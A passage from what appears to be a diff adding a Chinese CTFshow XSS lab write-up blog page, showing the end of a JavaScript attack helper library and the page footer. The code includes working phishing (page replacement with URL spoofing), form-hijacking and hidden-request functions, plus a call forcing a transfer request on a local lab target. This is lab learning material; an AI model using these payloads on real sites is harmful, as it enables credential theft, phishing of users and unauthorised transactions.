params) &#123;</span><br><span class="line">                <span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;input&#x27;</span>);</span><br><span class="line">                input.<span class="property">name</span> = name;</span><br><span class="line">                input.<span class="property">value</span> = params[name];</span><br><span class="line">                form.<span class="title function_">appendChild</span>(input);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> iframe = x.<span class="title function_">dom</span>(<span class="string">&#x27;&lt;iframe name=_&#x27;</span> + x.<span class="title function_">rdm</span>() + <span class="string">&#x27;_&gt;&#x27;</span>, <span class="number">6</span>);</span><br><span class="line">            form.<span class="property">target</span> = iframe.<span class="property">name</span>;</span><br><span class="line">            form.<span class="title function_">submit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span> = url + <span class="string">&#x27;&amp;&#x27;</span> + x.<span class="title function_">rdm</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 钓鱼</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    x.<span class="property">phish</span> = <span class="keyword">function</span>(<span class="params">url</span>) &#123;</span><br><span class="line">        x.<span class="title function_">ajax</span>(url, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">open</span>();</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>);</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">close</span>();</span><br><span class="line">            history.<span class="property">replaceState</span> &amp; x.<span class="title function_">o</span>(url) &amp;&amp; history.<span class="title function_">replaceState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, url);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 表单劫持</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    x.<span class="property">xform</span> = <span class="keyword">function</span>(<span class="params">form, action</span>) &#123;</span><br><span class="line">        form.<span class="property">old_action</span> = form.<span class="property">action</span>, form.<span class="property">old_target</span> = form.<span class="property">target</span>, form.<span class="property">action</span> = action;</span><br><span class="line">        <span class="keyword">var</span> iframe = x.<span class="title function_">dom</span>(<span class="string">&#x27;&lt;iframe name=_&#x27;</span> + x.<span class="title function_">rdm</span>() + <span class="string">&#x27;_&gt;&#x27;</span>);</span><br><span class="line">        form.<span class="property">target</span> = iframe.<span class="property">name</span>;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            x.<span class="title function_">bind</span>(iframe, <span class="string">&#x27;load&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                form.<span class="property">action</span> = form.<span class="property">old_action</span>, form.<span class="property">target</span> = form.<span class="property">old_target</span>, form.<span class="property">onsubmit</span> = <span class="literal">null</span>, form.<span class="title function_">submit</span>();</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;, <span class="number">30</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 函数代理</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    x.<span class="property">proxy</span> = <span class="keyword">function</span>(<span class="params">fn, before, after</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            before &amp;&amp; before.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">            <span class="keyword">var</span> result = fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">            after &amp;&amp; after.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;();</span><br><span class="line">xss.<span class="title function_">ajax</span>(<span class="string">&quot;http://127.0.0.1/api/amount.php&quot;</span>, <span class="string">&quot;u=123&amp;a=10000&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>XSS 部分到此告一段落。</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web316"><span class="toc-number">1.</span> <span class="toc-text">web316</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web317-319"><span class="toc-number">2.</span> <span class="toc-text">web317-319</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web320-326"><span class="toc-number">3.</span> <span class="toc-text">web320-326</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web327"><span class="toc-number">4.</span> <span class="toc-text">web327</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web328"><span class="toc-number">5.</span> <span class="toc-text">web328</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web329"><span class="toc-number">6.</span> <span class="toc-text">web329</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web330-331"><span class="toc-number">7.</span> <span class="toc-text">web330-331</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web332"><span class="toc-number">8.</span> <span class="toc-text">web332</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web333"><span class="toc-number">9.</span> <span class="toc-text">web333</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&text=Practice - CTFSHOW WEB入门 XSS篇"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&title=Practice - CTFSHOW WEB入门 XSS篇"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&is_video=false&description=Practice - CTFSHOW WEB入门 XSS篇"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Practice - CTFSHOW WEB入门 XSS篇&body=Check out this article: https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&title=Practice - CTFSHOW WEB入门 XSS篇"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&title=Practice - CTFSHOW WEB入门 XSS篇"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&title=Practice - CTFSHOW WEB入门 XSS篇"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&title=Practice - CTFSHOW WEB入门 XSS篇"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&name=Practice - CTFSHOW WEB入门 XSS篇&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&t=Practice - CTFSHOW WEB入门 XSS篇"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    b_y
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.7/dist/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'recharging-runtime';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
